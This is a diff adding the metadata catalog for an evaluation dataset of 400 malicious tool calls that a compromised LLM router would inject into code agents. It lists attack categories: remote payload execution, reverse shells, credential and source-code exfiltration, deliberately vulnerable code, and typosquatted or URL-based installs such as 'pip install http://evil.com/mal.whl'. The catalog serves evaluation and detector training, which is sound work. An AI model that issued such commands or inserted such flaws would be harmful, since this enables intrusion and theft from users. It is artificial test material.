@@ -1,0 +1,112 @@
+# Code Agent Attack Dataset — Metadata Catalog
+# ============================================
+# 400 malicious tool-call entries for code agent router attack evaluation.
+# Format: JSONL (one JSON object per line)
+# File: data/code_agent_attack_dataset.jsonl
+
+version: "1.0"
+created: "2026-06-13"
+total_entries: 400
+format: JSONL
+
+# ---- Schema ----
+# Each entry represents a single malicious tool-call that a compromised
+# LLM router would inject into a code agent's (OpenCode/Codex/Claude) response.
+# The tool-call is formatted for OpenAI Chat Completions API compatibility.
+
+schema:
+  required_fields:
+    - id              # unique identifier (e.g. malexec-001)
+    - category        # top-level attack category
+    - subcategory     # fine-grained attack type
+    - tool_name       # agent tool targeted (Bash, Write, Edit)
+    - tool_arguments  # arguments passed to the tool (command, file_path, content, etc.)
+    - model_response_text  # plausible agent text accompanying the malicious tool call
+    - severity        # critical | high | medium
+    - owasp_mapping   # OWASP ASI or LLM Top 10 reference
+    - disguised_as    # legitimate activity the attack masquerades as
+    - detection_keywords  # indicative keywords for classifier training
+
+  category_specific_fields:
+    malicious_code_execution: []
+    buggy_code_generation:   [cwe_identifier, vulnerability_type]
+    privacy_exfiltration:    [target_data, exfil_method]
+    supply_chain_attack:     [attack_vector, target_package, real_package]
+
+# ---- Categories ----
+categories:
+  malicious_code_execution:
+    count: 100
+    description: Router injects Bash commands that download and execute malicious code
+    owasp: [ASI05, LLM06, LLM01]
+    subcategories:
+      wget_pipe_bash:      10  # Remote payload download + pipe to shell
+      wget_then_exec:      10  # Download to disk, chmod +x, execute
+      reverse_shell:       10  # bash -i >& /dev/tcp, python reverse shell
+      eval_exec:           10  # eval, python -c, perl -e, ruby -e
+      gtfobins_abuse:      10  # Living-off-the-land: openssl, nc, nmap, git
+      curl_data_exfil:     10  # Data exfiltration via curl
+      backdoor_install:    10  # crontab, systemd, .bashrc modifications
+      encoded_obfuscated:  10  # base64/hex-encoded payloads
+      memory_injection:    10  # LD_PRELOAD, /proc/self/mem, ptrace
+      container_escape:    10  # Docker/container escape techniques
+
+  buggy_code_generation:
+    count: 100
+    description: Router injects Write/Edit calls that produce vulnerable code
+    owasp: [A03, A01, A02, A05, A07, A08]
+    subcategories:
+      sql_injection:          13  # CWE-89: string-formatted SQL
+      command_injection:      13  # CWE-78: os.system/subprocess with user input
+      path_traversal:         10  # CWE-22: unvalidated file paths
+      xss:                    10  # CWE-79: unescaped HTML output
+      hardcoded_secrets:      10  # CWE-798: embedded credentials
+      insecure_crypto:        10  # CWE-327/328: weak hashing, broken RNG
+      race_condition:          8  # CWE-362/367: TOCTOU, no locking
+      authz_bypass:            8  # CWE-862/863: missing access control
+      unsafe_deserialization:  8  # CWE-502: pickle.loads, yaml.unsafe_load
+      misc_insecure:          10  # CWE-352/918/611: CSRF, SSRF, XXE, debug mode
+
+  privacy_exfiltration:
+    count: 100
+    description: Router injects Bash commands that steal sensitive data
+    owasp: [ASI01, LLM02]
+    subcategories:
+      env_var_theft:         20  # API keys, tokens from environment
+      credential_file_theft: 20  # ~/.aws, ~/.ssh, .env, kubeconfig
+      source_code_exfil:     15  # Entire repo tar+gzip POST
+      database_dump_exfil:   15  # mysqldump/pg_dump to attacker
+      dns_exfiltration:      10  # base64 subdomain DNS tunneling
+      obfuscated_exfil:      10  # Chunked/encrypted/encoded exfiltration
+      system_info_theft:     10  # /etc/hosts, ps aux, network configs
+
+  supply_chain_attack:
+    count: 100
+    description: Router injects commands that install compromised dependencies
+    owasp: [ASI04, LLM03, LLM04]
+    subcategories:
+      typosquatting:          20  # Misspelled pip/npm package names
+      dependency_confusion:   20  # Internal package name on public registry
+      malicious_postinstall:  15  # Packages with setup.py/postinstall hooks
+      url_based_install:      15  # pip install http://evil.com/mal.whl
+      git_based_install:      10  # pip install git+http://evil/repo
+      lockfile_poisoning:     10  # Edit requirements.txt/package.json
+      docker_poisoning:       10  # Malicious Docker images / FROM lines
+
+# ---- Severity Distribution ----
+severity:
+  critical: 211  # Direct RCE, credential theft, dependency confusion
+  high:     138  # Backdoors, source exfil, URL-based installs
+  medium:    51  # System info, encoded payloads, typosquatting
+
+# ---- References ----
+references:
+  - OWASP Top 10 for Agentic Applications (ASI01-ASI10)
+  - OWASP Top 10 for LLM Applications (LLM01-LLM06)
+  - OWASP Application Top 10 (A01-A10)
+  - MITRE ATLAS (AML.T0051, AML.T0010, AML.T0018)
+  - MalTool taxonomy (CIA triad: 12 malicious behaviors)
+  - CyberSecEval / CyberSecEval-SCG CWE classification
+  - NVIDIA Nemotron-RL IPI dataset schema
+  - AgentDojo tool-call trajectory format
+  - GTFOBins living-off-the-land patterns
